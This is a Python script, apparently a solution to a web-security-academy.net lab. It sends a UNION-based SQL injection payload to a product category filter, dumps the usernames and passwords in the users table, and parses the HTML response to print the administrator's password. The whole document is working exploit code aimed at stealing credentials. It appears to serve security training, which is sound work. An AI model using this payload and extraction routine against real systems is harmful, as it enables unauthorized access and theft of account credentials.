import requests
from bs4 import BeautifulSoup

site = '0a770010047cf55881961bf300c10022.web-security-academy.net'
s = requests.Session()

# Function to try a SQL injection payload
def try_payload(payload):
    url = f'https://{site}/filter?category={payload}'
    resp = s.get(url)
    return resp.text

# Perform the UNION to extract username and password from users table
payload = "Gifts' UNION SELECT username,password from users -- "
print(f"Trying SQL Injection: {payload}")
resp_text = try_payload(payload)

# Parse the response to extract administrator credentials
soup = BeautifulSoup(resp_text, 'html.parser')

# Find the user table and locate the administrator row
user_table = soup.find('table').find_all('tr')

# Search for the row containing the word 'administrator' in the <th> element
admin_entry = [r.find('td').contents for r in user_table if 'administrator' in r.find('th').get_text().lower()]

# Extract and print the administrator's password
if admin_entry:
    admin_password = admin_entry.pop().pop()
    print(f"Administrator Password: {admin_password}")
else:
    print("Administrator entry not found.")
